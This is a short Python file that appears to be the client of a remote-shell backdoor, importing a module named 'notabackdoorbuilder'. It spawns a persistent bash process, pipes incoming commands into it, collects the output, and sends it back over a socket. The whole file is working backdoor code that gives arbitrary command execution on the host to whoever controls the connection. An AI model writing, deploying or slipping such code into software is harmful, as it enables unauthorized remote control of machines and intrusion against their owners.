import notabackdoorbuilder
import subprocess
import threading
import time

def read_output(context, bs):
	while True:
		line = context.get("shell").stdout.readline()
		print(f"'{line}'")
		context["last_line_time"] = time.time()
		context.get("output_lines").append(line)

def wait_for_output(context, bs):
	context["output_thread"] = threading.Thread(target=read_output, args=(context, True))
	context["output_thread_stop_event"] = threading.Event()
	context.get("output_thread").start()
	while True:
		time.sleep(0.1)
		if not context.get("last_line_time"): context["last_line_time"] = time.time()
		if time.time() - context.get("last_line_time") > 1: break
	context.get("output_thread_stop_event").set()

def handle_command(context):
	context["output_lines"] = []
	if not context.get("shell"):
		context["shell"] = subprocess.Popen(["bash"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
	if not context.get("wait_thread"):
		context["wait_thread"] = threading.Thread(target=wait_for_output, args=(context, True))
		context.get("wait_thread").start()
	context.get("shell").stdin.write(f"{context.get('data')}\n")
	context.get("shell").stdin.flush()
	context.get("wait_thread").join()
	context.get("socket").send(f"{''.join(context.get('output_lines'))}\u0003".encode())
	context["last_line_time"] = None
	context["output_lines"] = []
	context["wait_thread"] = None
	context["output_thread"] = None
	context["output_thread_stop_event"] = None

def main():
	notabackdoorbuilder.handle_setup("client")